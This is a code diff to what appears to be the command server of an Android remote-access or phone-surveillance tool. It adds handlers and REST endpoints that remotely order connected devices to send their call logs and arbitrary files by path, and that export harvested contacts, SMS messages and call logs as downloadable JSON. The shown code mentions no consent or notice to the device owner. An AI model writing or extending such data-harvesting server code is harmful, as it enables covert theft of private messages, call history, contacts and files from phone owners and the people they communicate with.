@@ -89,7 +89,8 @@ function handleDeviceMessage(ws, message) {
         location: null,
         contacts: [],
         files: [],
-        sms: [],
+        sms: { messages: [], error: null },
+        callLog: [],
         currentPath: '/storage/emulated/0',
       });
       console.log(`Device registered: ${deviceId}`);
@@ -119,6 +120,16 @@ function handleDeviceMessage(ws, message) {
     case 'sms_response':
       updateDeviceData(ws, 'sms', message.data);
       console.log('SMS updated for device');
+      break;
+      
+    case 'call_log_response':
+      updateDeviceData(ws, 'callLog', message.data);
+      console.log('Call log updated for device');
+      break;
+      
+    case 'file_download_response':
+      // Handle file download - could store temporarily or forward to client
+      console.log('File download received for device');
       break;
       
     default:
@@ -212,7 +223,8 @@ app.get('/api/devices/:deviceId', (req, res) => {
       isOnline: false,
       location: null,
       contacts: [],
-      sms: [],
+      sms: { messages: [], error: null },
+      callLog: [],
       files: [],
       currentPath: '/storage/emulated/0',
     });
@@ -229,7 +241,8 @@ app.get('/api/devices/:deviceId', (req, res) => {
     isOnline: device.isOnline !== false,
     location: device.location,
     contacts: device.contacts,
-    sms: device.sms || [],
+    sms: device.sms || { messages: [], error: null },
+    callLog: device.callLog || [],
     files: device.files || [],
     currentPath: device.currentPath || '/storage/emulated/0',
   });
@@ -325,24 +338,50 @@ app.get('/api/devices/:deviceId/contacts/download', (req, res) => {
     return res.status(404).json({ error: 'Device not found' });
   }
   
-  // Format contacts for better readability
-  const formattedContacts = device.contacts.map(contact => ({
-    name: contact.name || 'Unknown',
-    phoneNumbers: contact.phoneNumbers?.map(phone => phone.number) || [],
-    emails: contact.emails?.map(email => email.email) || [],
-    id: contact.id
+  // Format contacts similar to web app display
+  const formattedContacts = device.contacts.map((contact, index) => ({
+    id: contact.id || `contact_${index}`,
+    name: contact.name || 'Unknown Contact',
+    phoneNumbers: contact.phoneNumbers?.map(phone => ({
+      number: phone.number,
+      type: phone.label || 'mobile'
+    })) || [],
+    emails: contact.emails?.map(email => ({
+      email: email.email,
+      type: email.label || 'personal'
+    })) || [],
+    displayInfo: {
+      primaryPhone: contact.phoneNumbers?.[0]?.number || 'No phone',
+      primaryEmail: contact.emails?.[0]?.email || 'No email'
+    }
   }));
+  
+  // Sort contacts alphabetically by name
+  formattedContacts.sort((a, b) => a.name.localeCompare(b.name));
   
   const filename = `contacts-${device.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
   
   res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
   res.setHeader('Content-Type', 'application/json');
-  res.json({
+  
+  // Create a well-formatted JSON structure
+  const exportData = {
     deviceName: device.deviceName,
+    deviceInfo: {
+      brand: device.brand,
+      model: device.model,
+      platform: device.platform
+    },
     exportDate: new Date().toISOString(),
     totalContacts: formattedContacts.length,
+    summary: {
+      contactsWithPhone: formattedContacts.filter(c => c.phoneNumbers.length > 0).length,
+      contactsWithEmail: formattedContacts.filter(c => c.emails.length > 0).length
+    },
     contacts: formattedContacts
-  });
+  };
+  
+  res.json(exportData);
 });
 
 app.get('/api/devices/:deviceId/sms/download', (req, res) => {
@@ -358,11 +397,67 @@ app.get('/api/devices/:deviceId/sms/download', (req, res) => {
   res.json({
     deviceName: device.deviceName,
     exportDate: new Date().toISOString(),
-    totalMessages: device.sms?.length || 0,
-    messages: device.sms || []
+    totalMessages: device.sms?.messages?.length || 0,
+    error: device.sms?.error || null,
+    messages: device.sms?.messages || []
   });
 });
 
+app.get('/api/devices/:deviceId/call-log/download', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const filename = `call-log-${device.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
+  
+  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+  res.setHeader('Content-Type', 'application/json');
+  res.json({
+    deviceName: device.deviceName,
+    exportDate: new Date().toISOString(),
+    totalCalls: device.callLog?.length || 0,
+    calls: device.callLog || []
+  });
+});
+
+app.post('/api/devices/:deviceId/request-call-log', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  device.ws.send(JSON.stringify({
+    type: 'request_call_log',
+    data: {}
+  }));
+  
+  res.json({ success: true, message: 'Call log request sent' });
+});
+
+app.post('/api/devices/:deviceId/download-file', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  const { filePath } = req.body;
+  
+  device.ws.send(JSON.stringify({
+    type: 'download_file',
+    data: { filePath }
+  }));
+  
+  res.json({ success: true, message: 'File download request sent' });
+});
 // File upload endpoint
 app.post('/api/devices/:deviceId/upload', upload.single('file'), (req, res) => {
   if (!req.file) {
